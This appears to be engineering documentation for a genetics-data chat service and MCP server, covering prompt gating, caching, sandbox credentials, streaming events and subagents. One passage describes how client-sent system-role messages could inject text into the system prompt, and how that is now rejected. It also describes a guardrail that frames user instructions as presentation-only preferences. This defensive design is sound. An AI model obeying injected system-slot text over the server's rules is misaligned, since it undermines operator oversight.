`ENABLE_PHENOTYPE_REPORT=false`, and every per-tool routing section under `tool_profile="code"`.
`tool_names=None` skips the filtering entirely and emits every block.

Because a block is dropped for ANY unavailable name in it, a tool named in passing would take
its whole block with it — a parenthetical, an example or a negation is enough. **Domain science
and grounding rules are therefore written into blocks that name no tool**, with only the "which
tool" clause split into its own gated block: the HLA section, the pseudo-credible-set labelling
obligation, the case-sensitive `data_type` values and the membership / re-query rules all survive
on `bigquery` and `code`, which reach `credible_sets_v` and `hla_associations_v` through SQL.
Section headings follow the same rule — `## Data Sources and Resource Names` is its own ungated
block, because a gated heading over an ungated body reparents the body under the section before it.

**The gate matches tool NAMES, so guidance whose actionability rests on a PARAMETER or an output
FIELD is invisible to it** (`genetics-results-suite-4h6.75`) — such a block names no tool, so it is
emitted everywhere. Two were: the truncation remedy told surfaces with neither a `summarize`
parameter nor a database to use both, and the `products` imperative told `code` to check a field
only `list_datasets` returns. The remedy sentence is now split so each clause carries the gate for
the capability it names — `_SUMMARIZE_PARAM_TOOLS` for `summarize=true`, `query_database` or
`run_analysis` for the two ways of counting rows directly, and a generic "narrow the request"
fallback where neither applies — and the `products` imperative is gated on the two routes that
actually return the field, `list_datasets` and `run_analysis` (the SDK's `genetics.datasets()`
delegates to the same executor method and the same `/v1/datasets` response, which carries
`products` per dataset), with a further block naming that call on a surface that has only the SDK.
The products-vs-`data_type` distinction stays ungated, being knowledge about the data rather than
about a tool. `_SUMMARIZE_PARAM_TOOLS` is spelled out in `defaults.py` (importing
`tools.definitions` at module scope would make `config` depend on `tools`) and is checked against
the real input schemas by `tests/test_system_prompt.py`, so a parameter added to or dropped from a
tool cannot leave the gate behind.

**A prohibition is emitted with a route or not at all, and the route it names must be true on the
surface that gets it** (`genetics-results-suite-4h6.76`). The "NEVER query the database for
consequence / allele frequency / rsID / pathogenicity" block is gated on `query_database` or
`run_analysis`, but the sentence naming where those annotations DO come from names
`get_variant_annotations` and `get_myvariant_annotations` — so the text gate dropped the remedy on
`bigquery` and on `code` and left the prohibition standing with no way out. Four variants now
follow it, split by the two capabilities that differ across those surfaces — the sandbox, and
`get_variant_protein_effect`, which returns a coding SNV's amino-acid change with its curated
ClinVar significance, population frequency and rsID:

- with the annotation tools (`None`, `api`) — pointed at `get_variant_annotations` /
  `get_myvariant_annotations`;
- with the sandbox and `get_variant_protein_effect` (`bigquery`) — pointed at
  `genetics.variant_annotation(...)` for consequence/AF/gene and at `get_variant_protein_effect`
  for a coding SNV's clinical annotation;
- with the sandbox but no annotation tool at all (`code`, seven tools) — pointed at
  `genetics.variant_annotation(...)`, and told that clinical significance and pathogenicity are
  genuinely unavailable, which is true only there;
- with `query_database` alone and `get_variant_protein_effect` (`bigquery` with
  `SANDBOX_ENABLED=false`, what `chat-backend.yaml` declares today) — pointed at
  `get_variant_protein_effect` for coding SNVs and told to say so for everything else.

The blanket "there is no variant-annotation tool on this surface" wording survives only for a
surface with `query_database`, no sandbox and no `get_variant_protein_effect` — no shipped profile
today, so its test drives the assembly directly. Naming `get_variant_protein_effect` in the two
bigquery-facing variants makes them self-gating under the text rule, which is exactly their
precondition. All of this reasons about LOCAL tools: the always-on external MCP servers attached in
`llm_service.py` (gnomAD, Open Targets) never appear in the prompt's tool list, so an annotation
route they might add is not accounted for here.
`TestTheAnnotationProhibitionAlwaysCarriesARoute` asserts exactly one of the routes is emitted
wherever the prohibition is — and, in the other direction, that no rendered prompt tells the model
to refuse something the same prompt documents a tool for — and `TestGuidanceKeyedOnAParameterOrAFieldIsGated` asserts
each remedy clause reaches exactly the profiles whose tools can act on it — both read the rendered
prompt per profile, since a check that reads the `_Block` metadata only restates the constant that
was changed.

`tests/test_system_prompt.py` pins three properties across the `None`/`api`/`bigquery`/`rag`/`code`
profiles with `ENABLE_SUBAGENTS` both true and false: **absence** (every tool name in the emitted
prompt is in the resolved list, tokenising independently of the gate's own matcher), **presence**
(emitted headings pinned per profile, load-bearing science and grounding strings asserted present
— absence-only assertions cannot see text going missing), and **structure** (no body line lands
under a different heading than it has in the unfiltered text, no heading is emitted empty). It
also asserts the `run_analysis` bullet is byte-identical across every arm that carries it, which
is what makes the `code`-vs-baseline A/B a comparison of tools rather than of wording.
A fourth property is deliberately NOT parametrised over the five profiles, because that is what
missed the defect it guards: `TestEverySurfaceWithADataPathIsRouted` drives ~80 tool sets off the
full list — every single-tool removal plus flag-shaped family removals and their pairs — and
asserts each surface reaching data through `get_credible_sets_by_gene`, `query_database` or
`run_analysis` emits **exactly one** arm-routing sentence, never zero and never two. Every profile
happens to carry all three tools the API-preference bullet cited as examples, so the bullet's
hostage dependence on them was invisible profile-by-profile.
`tests/test_llm_service.py::TestResolveLocalToolNames` pins the resolution itself: `MCP_ENABLED=false`
advertises nothing, and `ENABLE_SUBAGENTS=true` with a dead `subagent_service` still hides
`launch_subagents`. Those two disabling reasons must remain distinguishable in tests, so
`_CapturingService` in `tests/test_chat_api.py` holds a live `subagent_service`.

**Routing arbitration has one home.** The preference between "call a dedicated API tool", "write
SQL" and "write one script" is stated once, in the prompt's "Choosing How to Get Data" section,
in the variant matching the tools present. It used to live half in the prompt ("prefer API tools
over the database") and half inside `run_analysis`'s description ("use this instead of chaining
data-access tools"), which contradicted it and was invisible to anyone reading the prompt.
`run_analysis`'s description now states its capability only. Preconditions of a single tool stay
in that tool's description, where they travel with it and reach MCP clients too — which is why
"call `get_database_schema` first" lives in `query_database`'s description and is no longer
repeated in the prompt. A surface with `run_analysis` but no `query_database` (profiles `api`
and `code`) has neither that tool nor `get_database_schema` yet still reads all the SQL
guidance, so it gets the SDK's own route — `genetics.schema()` / `genetics.schema('<view>')`,
emitted only there.

Which routing variant is emitted turns on two facts about the surface: whether the per-entity API
tools are present (`get_credible_sets_by_gene` is the sentinel the database-only variant already
excludes on) and whether `query_database` is. Both API-side variants used to encode the first fact
only by NAMING those tools in an illustrative `(e.g. …)` list, so removing any one example — a
flag in front of `get_gene_based_results`, say — dropped the sentence on the text gate while the
other variants stayed suppressed by their own `excludes`, and the whole API-vs-database
arbitration disappeared, leaving the `run_analysis` bullet unopposed on a benchmark built to
compare exactly those two. The precondition is now an explicit `requires_all` and each `(e.g. …)`
list is its own block: an absent example costs the examples, never the arbitration.

The same capability had a second form: a client-sent **system-role message**. `ChatMessage.role`
was an unvalidated `str`, and `_stream_openai` forwarded the caller's messages verbatim after
prepending the server prompt, so injected text landed in a genuine system slot *after* the server's
— weaker than replacing it (the grounding rules still shipped) but the same channel. `role` is now
`Literal["user", "assistant"]`, so such a message is **422'd at the model boundary** rather than
filtered: no caller in the suite sends one, and `POST /chat/v1/chat/sessions/{id}/messages` already
rejects any other role, so failing closed is consistent and honest about what was sent. Both
provider paths additionally drop system-role messages themselves — `stream_chat` is also callable
with raw dicts, and neither path should depend on the other's validation.

The stored body is truncated to `INSTRUCTION_SET_MAX_BODY_CHARS` **before** wrapping, so the
envelope's fence is computed over the text that actually ships — a cut landing inside a backtick
run would otherwise escape it. Only the set id (and, outside secret mode, its name) is logged;
the body, which is user-authored free text, never reaches the log.

`instruction_envelope()` (`config/defaults.py`) builds the fragment: a preamble framing the text as
a *preference expressed by the user, not a rule from the system*; the body inside a fence whose
length is computed from the body's own longest backtick run; then a guardrail postamble that
**trails** the body — whatever comes last reads as the most recent instruction, so the ordering
that puts the verbosity fragment at the end inverts once arbitrary user text follows it. The
postamble restates that instructions govern presentation only (tone, audience, depth, units,
which resources to reach for, the language to answer in), never how an answer is derived or what
may be asserted, and that the rules above win on conflict.

### Two cached system blocks

`_stream_anthropic` emits `system` as two blocks, each with its own `cache_control`:

| Block | Content | Cache behaviour |
|---|---|---|
| 0 | default system prompt + verbosity fragment | identical for every user — one entry per verbosity value serves the whole user base |
| 1 | this user's instruction envelope (omitted entirely when there is none) | one small per-user entry |

Concatenating them would refragment the ~7.4K-token shared block per user per event (~$0.043)
instead of writing the small per-user block (~$0.0025); leaving the user block uncached costs
~$0.05 across a 25-iteration turn. This consumes the **fourth and last** of Anthropic's cache
breakpoints — tool definitions, the shared system block, the user system block, and the last
replayed message. **There is no spare**: anything that wants a new breakpoint has to take one of
these away.

### Where the choice is visible afterwards

`chat_messages.instruction_set_id` records the set in force per message (added by an `ALTER TABLE`
migration in `chat_history_db.py`). `add_message` writes it with
`ON CONFLICT … SET instruction_set_id = excluded.instruction_set_id`, matching the existing
semantics of `tool_profile` / `literature_backend` / `tool_results_json` — so a re-save that
**omits** the field clears it, and every client save path must send it. The admin sessions list
(`routers/admin.py`) carries `instruction_set_name`, resolved from the last message in the session
that named a set (the selector can move mid-conversation) and looked up lazily and memoized per
`(user_id, set_id)`, so a page where nobody used a set never opens the config DB. The nightly
`analyze_conversations.py` report breaks down by instruction set alongside the tool-profile
breakdown; `--llm-config-db` defaults to `llm_config.db` beside `--db` (which resolves correctly
for the CronJob, where both files sit on the same PVC) and a read failure degrades to grouping by
raw id rather than failing the run.

### Documented exclusions

- **Subagents do not receive them.** A subagent's system prompt is its skill instruction file
  (`subagent.py`), and its report is an intermediate artifact the main agent rewrites, not text
  the user reads. So "answer in Finnish" correctly produces English subagent reports and a Finnish
  final answer.
- **The standalone MCP server path does not apply them.** There is no server-side system prompt on
  that path at all — the client owns it — `_validate_user_token` (`mcp_server.py`) returns a
  bool and discards the identity behind the token, and the deployed `mcp-server` pod mounts no
  `chat-data` volume, so `llm_config.db` is not even reachable from it.
- **The OpenAI provider branch applies them too**, as one concatenated system message rather than
  two blocks: the split exists to give each half its own prompt-cache breakpoint, which that path
  has no equivalent for. Order matches Anthropic's — the envelope follows the server prompt. It
  previously dropped `user_instructions` outright with no log line, so a user with a set selected
  saw it applied in the UI while the model never received it; `provider` is client-selectable and
  `OPENAI_API_KEY` is wired into the pod, so that was reachable rather than theoretical
  (`genetics-results-suite-b3v`).

## Architecture

### Module structure

```
src/genetics_mcp_server/
├── __init__.py
├── mcp_server.py        # standalone MCP server entry point
├── mcp_client.py        # MCP client for testing
├── mcp_proxy.py         # proxy for external MCP servers
├── chat_api.py          # FastAPI chat service
├── llm_service.py       # LLM provider integration
├── logging_config.py    # GCP Cloud Logging JSON formatter
├── rate_limit.py        # per-user sliding window rate limiter
├── cost.py              # Anthropic API cost estimation
├── download_store.py    # disk-persisted download storage for TSV files
├── sandbox_token.py     # mints the per-execution, audience-scoped sandbox credentials
├── sandbox_client.py    # HTTP transport to the sandbox supervisor (POST /execute, GET /health)
├── config/
│   ├── __init__.py
│   ├── settings.py      # configuration dataclass
│   └── defaults.py      # default prompts and values
├── tools/
│   ├── __init__.py
│   ├── definitions.py   # tool definitions (shared)
│   ├── executor.py      # tool execution via HTTP
│   ├── sql_safety.py    # allow-list validation of values spliced into server-built SQL
│   ├── uniprot.py       # UniProtKB / EBI Proteins API client (TTL cache, accession/symbol resolution)
│   └── phewas_categories.py  # PheWAS plot category mappings
├── sdk/                    # importable `genetics` data SDK (thin layer over ToolExecutor)
│   ├── __init__.py      # sync module-level functions, shared client lifecycle
│   ├── client.py        # GeneticsClient: one async method per data product
│   ├── _runner.py       # background event loop backing the sync facade
│   └── errors.py        # GeneticsError / GeneticsUsageError
├── subagent.py             # parallel subagent service
├── scripts/
│   ├── analyze_variants.py # standalone variant list analysis CLI
│   ├── analyze_conversations.py # conversation history analysis and eval extraction
│   ├── analysis_timeseries.py  # shared rolling-window aggregation used by both renderers
│   ├── plot_conversation_scores.py # time-series plots of quality over time (from metrics.json)
│   ├── backfill_metrics_dates.py # one-off: join session created_at into an older metrics.json
│   ├── replay_benchmark.py  # paired A/B replay of recorded conversations through /chat/v1/chat
│   └── conversation_prompts.py  # LLM prompt templates for topic categorization
├── skills/
│   ├── __init__.py
│   ├── definitions.py      # skill definitions and registry
│   ├── sandbox_tools.py    # file read and script execution tools
│   └── instructions/       # markdown instruction files per skill
├── auth/
│   ├── __init__.py
│   ├── core.py          # IAP/oauth2-proxy header extraction
│   └── dependencies.py  # FastAPI auth dependencies
├── db/
│   ├── __init__.py
│   ├── singleton.py     # async DB singleton base
│   ├── llm_config_db.py    # user LLM config storage
│   └── chat_history_db.py  # conversation persistence
└── routers/
    ├── __init__.py
    ├── admin.py         # admin page: all conversations, analytics
    ├── api_tokens.py    # per-user API token management
    ├── llm_config.py    # LLM config API endpoints
    └── chat_history.py  # chat history API endpoints
```

### Data flow

1. **MCP Server mode**: Client → FastMCP → ToolExecutor → Genetics API
2. **Chat API mode**: HTTP → FastAPI → LLMService → Anthropic/OpenAI → ToolExecutor → Genetics API
3. **Subagent mode**: Main Agent → `launch_subagents` tool → SubagentService → parallel Claude API calls → ToolExecutor/External Tools → results aggregated back to main agent
4. **SDK mode**: script → `genetics_mcp_server.sdk` → GeneticsClient → ToolExecutor → Genetics API / BigQuery. Same executor, different entry point: no tool schema, no context row cap, polars frames instead of result envelopes.

### Sandbox transport (`sandbox_client.py`)

The client half of the seam between chat-backend and the code-execution sandbox. The wire
contract lives in `docs/code-execution-security.md` §2 of **genetics-results-suite**, not
here, and that is structural rather than an oversight: the sandbox image pip-installs only
the SDK's import closure and prunes the rest, so the supervisor and this client cannot share
a module and the document is the only definition both ends can read. Every number the two
sides must agree on is a named constant at the top of `sandbox_client.py` rather than a
literal at a call site.

- **One credential per execution, minted at the last possible moment.** `execute()` calls
  `mint_execution_tokens` *inside* the retry loop. The tokens live 300s and a queued
  execution eats that slack (a full queued wait then a full run leaves ~60s of token life),
  so a pair minted before a wait would spend itself on the wait.
- **Fail closed.** `SandboxTokenUnavailable` is never caught. With no signing key there is no
  execution — the alternatives are sending no credential or sending `INTERNAL_API_SECRET`,
  which are the two outcomes the mechanism exists to prevent. Tokens are never logged, and a
  token echoed back by the supervisor in **either** half of an error object — `error.type` as
  well as `error.message` — is scrubbed and capped before any error text is built or attached
  to the exception (`error.type` is carried onto `SandboxError.error_type`, so scrubbing only
  the formatted message would have left the raw value on the exception).
- **A retry always mints a fresh `execution_id`.** A repeated id is refused with
  `409 DuplicateExecutionId`, so reusing one after a `429` would turn a queue collision into
  a hard failure. `409 TokenExpired` is the opposite case and is retried immediately.
- **"No sandbox" is a distinct failure from "your script failed".** `SandboxUnavailable`
  covers a refused connection, `503 NotReady` and gateway errors, because `strategy: Recreate`
  plus a 130s termination grace leaves no sandbox at all for up to ~130s of a deploy. The read
  deadline is queue wait **plus** the full run plus margin, so it clears the supervisor's own
  worst case; a script that runs too long is a `200` with `status: "timeout"`, never an
  exception here.
- **Transport only.** The supervisor's result object is returned unchanged for the tool layer
  to render. `error.type` is treated as an open string — the reserved supervisor names are
  branched on, anything else is carried through as an opaque label.
- **No total deadline, deliberately.** Each attempt is bounded; the sum is not (~585 s worst
  case). The cap belongs to whoever owns the chat turn, and that is `run_analysis` — see
  `ToolExecutor._RUN_ANALYSIS_DEADLINE_S` under Code execution tools. Its only caller is that
  handler.

### Turn termination and truncation

`_stream_anthropic()` decides whether to keep looping from three signals, not one:

- **`tool_use` blocks present** — execute the tools and continue the loop, as before.
- **`stop_reason == "max_tokens"` with no tool_use blocks** — the turn was cut off by the
  output cap. The partial assistant turn is fed back followed by a user turn asking it to
  resume (a *trailing assistant* message would be a prefill, which Opus 4.6+ rejects), up
  to `MAX_CONTINUATIONS` times. Only if it is still truncated after that does the stream
  append a visible "cut short by the output token limit" notice.
- **`stop_reason == "end_turn"`, no tool_use blocks, no tool ran all turn, and the text
  presents unfilled results** — the model announced a query it never made and tabled up
  placeholders in place of the answer. Resumed the same way with
  `CONTINUE_UNFILLED_PROMPT`, sharing the `MAX_CONTINUATIONS` budget; if it keeps coming
  back unfilled, a "results above were left unfilled" notice is appended.

`_has_unfilled_output()` decides the third case from the artifact — placeholder cells such
as `*[from query]*`, or a column-label header with no data under it — never from "let me
pull the rows" phrasing. Over the stored chat history the phrasing fires on five times as
many turns, mostly ones that correctly stop to wait for the user ("paste your gene list and
I'll run it"), where resuming would answer on the user's behalf. Markdown links count as
data (citation tables are full of them), and a two-column header-only table is left alone
because that is also how a single labelled value is written (`| Result | 0 rows |`). The
system prompt carries the matching rule against presenting output that was never retrieved;
the loop guard is the backstop for when the model writes one anyway.

This matters because `max_tokens` bounds thinking *and* visible text together, so a
reasoning-heavy turn can exhaust the budget mid-sentence. Ignoring `stop_reason` made that
indistinguishable from a completed answer: the loop broke, `done` was emitted, and the
client persisted a truncated response with no error and no marker.

Both loops send the same continuation instruction for the `max_tokens` case,
`CONTINUE_TRUNCATED_PROMPT` in `config/defaults.py`. The unfilled-results guard is chat-only:
a subagent's report goes back to the main agent, which can challenge it, rather than to a
user reading a table.

`thinking` is set explicitly to `{"type": "adaptive", "display": "summarized"}` for models
that support it (`model_supports_adaptive_thinking()` in `settings.py`; the 4.6 generation
and later) rather than relying on per-model defaults — Opus 5 thinks when the parameter is
unset while 4.8/4.7 do not, so leaving it off makes the token budget depend on which model
happens to be configured. Thinking blocks are streamed as keepalives but deliberately not
persisted in `message_content`: they are only replayable to the model that produced them.

Short structured calls go the other way and turn thinking **off**: session-title
generation (`routers/chat_history.py`) and every `analyze_conversations.py` call
produce a title or a JSON object, so reasoning would only eat the token budget — a
50-token title has no room for it. `model_rejects_disabled_thinking()` guards the
opt-out, since Fable and Mythos always think and 400 on `{"type": "disabled"}`.
Responses on those paths are read by concatenating `text` blocks, never
`content[0]`, which on a thinking-capable model is a `ThinkingBlock` with no
`.text` — that mismatch is what broke the nightly analysis job on Opus 5.

### SSE event types

The chat API streams responses as Server-Sent Events (SSE). Each event is a JSON object with a `type` field:

| Event type | Description | Key payload fields |
|------------|-------------|--------------------|
| `content` | Streamed text token from the LLM response | `content` (string) |
| `thinking` | Keepalive emitted while the model reasons. Carries no reasoning content — thinking deltas do not reach the text stream, so without this tick a long reasoning phase reads as a stalled connection to the client's inactivity timeout. Rate-limited to one per 10s. The reasoning text itself travels only as `thinking_summary`, and only on request | none |
| `thinking_summary` | The iteration's **summarized** reasoning, emitted only when the request set `capture_thinking`. The browser never sets it, so this event does not exist on the UI path; the replay benchmark does, so a transcript can show the reasoning behind each tool call. Never the raw chain of thought — no model exposes it — and never persisted: the text is deliberately kept out of `message_content` even while it is being streamed, so a caller that asks for it cannot write reasoning into a stored conversation or replay it to the model. `redacted_thinking` blocks emit nothing, their payload being encrypted | `iteration`, `text` |
| `usage` | Context usage and timing snapshot after each agentic loop iteration | `iteration`, `input_tokens`, `cache_read`, `cache_create`, `output_tokens`, `total_input_tokens`, `total_output_tokens`, `context_window`, `context_percent`, `turn_elapsed_ms`, `model_ms`, `model_attempts` |
| `tool_use` | One per tool call, emitted before the tool runs. Carries the input **whole** — the client renders it as a collapsed disclosure, so nothing is sized for reading inline. `input` has had `user`/`session_id` dropped for `run_analysis` and `backend` resolved for `search_scientific_literature` | `id` (the `tool_use` block id, what `script_result` correlates against), `name`, `input` (object) |
| `script_result` | Outcome of one completed `run_analysis`, emitted before the next iteration's `usage` | `iteration`, `tool_use_id`, `ran`, `ok`, `status`, `timed_out`, `exception`, `limit`, `duration_ms` |
| `image` | Base64-encoded image (e.g., PheWAS plot) | `image_data` (base64 string), `image_format`, `image_alt` |
| `error` | Error message from the backend | `content` (error string) |
| `done` | Signals the stream is complete | `message_content` (assistant text + `tool_use` blocks for persistence), `tool_results` (the `tool_result` blocks for this turn, for persistence) |

The `usage` event is emitted by `_stream_anthropic()` in `llm_service.py` after token accounting in each iteration of the agentic loop. It is yielded as a `StreamChunk(type="usage")` with a JSON-serialized payload. The `event_generator()` in `chat_api.py` forwards it as an SSE event, spreading the usage fields into the top-level payload alongside `"type": "usage"`.

Payload fields for `usage`. Every token count is for the **current** API call unless its
name says `total_`:
- `iteration` — current agentic loop iteration number
- `input_tokens` — the **whole context** sent in this call, i.e. Anthropic's
  `input_tokens + cache_read_input_tokens + cache_creation_input_tokens`. It is **not**
  the billed uncached input, and it is not comparable to `total_input_tokens`, which
  accumulates only the uncached part. Named for what the frontend meter renders; its
  meaning is deliberately frozen (`genetics-results-suite-n3p`)
- `cache_read` — the part of `input_tokens` served from the prompt cache
- `cache_create` — the part of `input_tokens` written into the prompt cache. Kept apart
  from `cache_read` because the two differ by more than 12x in price, so folding them
  together makes an exact cost underivable
- `output_tokens` — output tokens generated in this call
- `total_input_tokens` — cumulative **billed uncached** input across all iterations so
  far, i.e. the running sum of `input_tokens - cache_read - cache_create`
- `total_output_tokens` — cumulative output tokens across all iterations
- `context_window` — total context window size for the model (from `get_context_window()`)
- `context_percent` — percentage of the context window this call filled
  (`input_tokens / context_window * 100`)
- `turn_elapsed_ms` — milliseconds **since the turn started** (the same monotonic zero as
  the `wall_ms` written to `chat_turn_metrics`), sampled the moment this iteration's model
  response completed. Cumulative, not a per-iteration delta — the delta is the difference
  between consecutive values, so both readings are available and neither has to be guessed
- `model_ms` — wall time of **this iteration's model call**, which is *not* the same as
  model latency: the timed span encloses the whole transient-error retry loop, so a retry's
  1/2/4 s backoff sleep is inside the figure, and because the producer is an async generator
  yielding per delta it also carries downstream SSE serialisation and socket backpressure.
  `turn_elapsed_ms` minus the previous iteration's `turn_elapsed_ms` minus this `model_ms`
  is exactly the previous iteration's tool phase, because this chunk is emitted before any
  tool of its own iteration runs
- `model_attempts` — how many times the streaming call was attempted this iteration (`1`
  when it succeeded first time). Emitted so that a retry-inflated `model_ms` is
  *identifiable* rather than merely disclaimed; the backoff schedule is deterministic
  (1 + 2 + 4 s), so an attempt count bounds how much of the figure is sleep

Payload fields for `script_result`, one per completed `run_analysis` call:
- `iteration` — the agentic-loop iteration whose model response requested the script
- `ran` — whether the **sandbox executed** the script at all. That is the only question it
  answers. It is **not** a verdict on whose fault a non-run was: `false` covers a restarting
  sandbox, a full queue and an unminted signing key, which say nothing about the script —
  but it also covers `EmptyScript` (the model emitted blank or non-string `code`) and
  `SandboxRejected` (the model chose a `timeout_s` outside 1..120, or oversize code), which
  are the model's doing entirely. A consumer splitting model faults from infrastructure
  faults classifies on `status`, never on `ran` alone
- `ok` — whether the script succeeded. **There is no `exit_code`**: the supervisor answers
  with a status string, so an exit code would be invented rather than measured
- `status` — the supervisor's `ok` / `error` / `timeout` / `limit` when `ran`, otherwise
  the executor's error type (`EmptyScript`, `SandboxRejected`, `SandboxUnavailable`,
  `SandboxBusy`, `SandboxNotConfigured`, `TurnBudgetExceeded`, …). Every non-run shape sets
  one — the blank-script shape gained `EmptyScript` for exactly this reason, since without
  it the chunk read `unknown`, indistinguishable from a genuine transport fault
- `timed_out` — the **script's own** wall clock fired; not the turn budget, whose expiry
  leaves the script possibly still running
- `exception` — the script's exception type when it failed, else `null`
- `limit` — which sandbox limit fired (`OutputLimit`, `MemoryLimit`, …), else `null`
- `duration_ms` — the sandbox's own measured execution time when it reported one

The chunk carries metadata only: the script's source, its output and its artifact names
stay in the `tool_result` the model reads. It is what `replay_benchmark.py` counts script
failures and retry loops from.

A consumer can therefore price **the main agentic loop's Anthropic API calls** exactly
from the stream alone, with no `chat_turn_metrics` row: uncached input is
`input_tokens - cache_read - cache_create`, and the three components go to
`estimate_cost()` unchanged. This matters because secret chat — which every
replay-benchmark request uses — writes no metrics row at all.

That is not the same as pricing the whole turn. Four things sit outside the sum, and the
first two sit outside the `chat_turn_metrics` row as well, so the stream and the row
agree with each other while both understate what was billed:

- **Subagent calls.** `subagent.py` issues its own `messages.create` and keeps private
  token counters; `_stream_anthropic()` accumulates only `iter_cost` into `total_cost`.
  A turn that calls `launch_subagents` costs strictly more than either source reports.
- **Retried attempts.** A mid-stream overload/529 is retried in place, and only the
  succeeding attempt's `message.usage` is ever read. Tokens burned by the abandoned
  attempts are billed and invisible.
- **The OpenAI path emits no `usage` chunk at all.** `_stream_openai()` yields text and
  `done` only, so this whole section is Anthropic-path-only. `replay_benchmark.py`
  handles that case with a `no_usage_chunks` status rather than a zero.
- **The stream carries no model name.** `estimate_cost()` falls back to Sonnet pricing
  for anything unrecognised (`has_pricing()` exists so callers can refuse instead), so
  the consumer must learn the model out-of-band and pass it in.

The frontend uses `usage` events to render a live progress bar showing how much of the model's context window has been consumed during the conversation.

### Tool execution

Tools are defined once in `tools/definitions.py` with:
- Name and description
- Parameter schemas (type, required, defaults)
- Registration helpers for both FastMCP and Anthropic formats

The `ToolExecutor` class implements each tool as an async method that:
1. Builds the request to the genetics API
2. Handles errors and 404 responses gracefully
3. Optionally summarizes large result sets
4. Returns structured JSON with `success` flag

### External MCP proxying

The `mcp_proxy.py` module allows connecting to remote MCP servers:
1. Fetches tool definitions via JSON-RPC initialize/tools/list
2. Dynamically creates wrapper functions using exec()
3. Forwards tool calls to the remote server
4. Parses SSE responses and extracts JSON-RPC results

### Subagent system

The subagent system enables the main agent to launch parallel specialized agents for complex queries. When enabled, the main agent has access to a `launch_subagents` tool that dispatches tasks to specialized subagents.

**Skills** define subagent capabilities:
- `genetics_data_extraction` — API tools for GWAS, QTL, credible sets, etc.
- `literature_review` — scientific literature and web search
- `database_analysis` — complex SQL queries against the genetics database
- `variant_list_analysis` — analyze multiple variants for shared patterns
- `data_analysis` — Python script execution for custom analysis and visualizations

Each skill has:
- A markdown instruction file (system prompt) in `skills/instructions/`
- Tool categories controlling which tools the subagent can use
- Configurable model, max iterations, and timeout
- Optional sandbox tools (file read, script execution)
- `include_external` flag — when `True`, external MCP server tools (e.g. gnomAD, Open Targets) are appended to the subagent's tool set via `get_external_anthropic_tools()`. Currently enabled for `genetics_data_extraction`.

**Recursive launch prevention**: The `launch_subagents` tool has category `orchestration`, which is included only for the main agent. Subagent tool sets explicitly exclude `launch_subagents` to prevent recursive launches.

**Advertisement gated on availability**: `launch_subagents` is advertised to the LLM only when the subagent service actually initialized (`self.subagent_service is not None`), not merely when `ENABLE_SUBAGENTS` is set. The service requires a live Anthropic client + executor in addition to the flag, so `_stream_anthropic()` adds `launch_subagents` to the effective `disabled_tools` whenever the service is absent. This single source of truth prevents the LLM from seeing a tool that would return "subagent service isn't available" on call.

**Report truncation**: the subagent loop applies the same `stop_reason` handling as the main
chat loop (see "Turn termination and truncation"). A report stopped by the output cap is
resumed up to `MAX_CONTINUATIONS` times, with the carried-over text prepended so the report
reads as one piece. If it is still incomplete, `SubagentResult.truncated` is set, a
`[TRUNCATED: ...]` marker is appended to the output, and the flag is passed through
`run_subagents()` into the tool result — so the main agent knows it is reasoning over
partial findings instead of treating a fragment as the subagent's complete answer.
`skill.max_tokens` covers thinking as well as report text.

**Cost and token tracking**: `SubagentResult` accumulates `input_tokens` and `output_tokens` across all iterations of a subagent's agentic loop. After `launch_subagents` completes, `llm_service.py` sums tokens across all subagent results and logs an aggregated cost estimate using the same `estimate_cost()` function as the main agent.

**Subagent IDs**: Each subagent receives a unique ID (`sa-1`, `sa-2`, ...) assigned sequentially when `run_subagents()` launches them. The ID appears in all log messages and progress callbacks, e.g. `Subagent 'literature_review' [sa-2] calling search_scientific_literature(query='PCSK9')`.

**Progress streaming**: Subagent progress is streamed to the user in real time via an `asyncio.Queue` bridge:
1. `SubagentService.run_subagents()` accepts an optional `progress_callback` invoked at subagent start, each tool call, completion, and failure
2. Progress messages include the subagent ID and tool call parameters formatted by `_format_tool_params()` — a helper that produces compact `(key='value', ...)` strings, truncating long values and representing complex types as `<list>`/`<dict>`
3. In `llm_service.py`, the callback puts messages onto an `asyncio.Queue`
4. The main streaming loop drains the queue, yielding each message as an SSE `StreamChunk` (displayed as italicized status text)
5. A sentinel `None` signals all subagents have finished, ending the drain loop
6. Regular tools and subagents run concurrently — regular tool tasks are gathered alongside the subagent task

**System prompt orchestration guidance**: The default system prompt (`config/defaults.py`) includes a "Subagent Orchestration" section — emitted **only when `launch_subagents` is in the resolved tool list**, so with `ENABLE_SUBAGENTS=false` the model is neither given the tool nor told about it — that tells the LLM:
- When to use subagents vs direct tool calls (parallel independent tasks vs simple lookups)
- Available skills and their best use cases
- How to structure subagent tasks (self-contained questions, pass context explicitly, split by skill not entity)

**Skill instructions**: Each skill has a markdown instruction file in `skills/instructions/` that serves as the subagent's system prompt. Instructions include:
- Guidelines for structured output format (exact numbers, systematic organization)
- Error handling rules (report missing data explicitly, handle tool failures gracefully)
- Data source mapping guidance (use `list_datasets` to discover datasets, case-sensitive data types)
- Scope constraints (e.g., data extraction skills should not interpret, just organize)

**Execution flow**:
1. Main agent calls `launch_subagents` with a list of skill+query tasks
2. `SubagentService` validates skills and launches subagents in parallel via `asyncio.gather()`
3. Each subagent runs its own agentic loop (non-streaming) with Claude API
4. Progress callbacks stream status to the user via `asyncio.Queue`
5. Results (including per-subagent token counts) are collected and returned to the main agent
6. Main agent synthesizes subagent outputs into its response

**Security**:
- File access restricted to configured `SUBAGENT_ALLOWED_PATHS` directories
- Script execution gated behind `ENABLE_SCRIPT_EXECUTION` flag
- Interpreter whitelist: `python3`, `Rscript`, `bash`
- Sensitive environment variables stripped from script processes
- Per-subagent and per-script timeouts

## Configuration

All configuration is via environment variables (`.env` file supported):

### Required

| Variable | Description |
|----------|-------------|
| `GENETICS_API_URL` | Base URL of the genetics REST API |
| `BIGQUERY_API_URL` | Base URL of the BigQuery proxy API |

### Upstream service access (optional)

| Variable | Description | Default |
|----------|-------------|---------|
| `GENETICS_PUBLIC_API_URL` | Externally reachable base URL used when building download links shown to users; falls back to `GENETICS_API_URL`, which in a cluster is an internal address | `GENETICS_API_URL` |
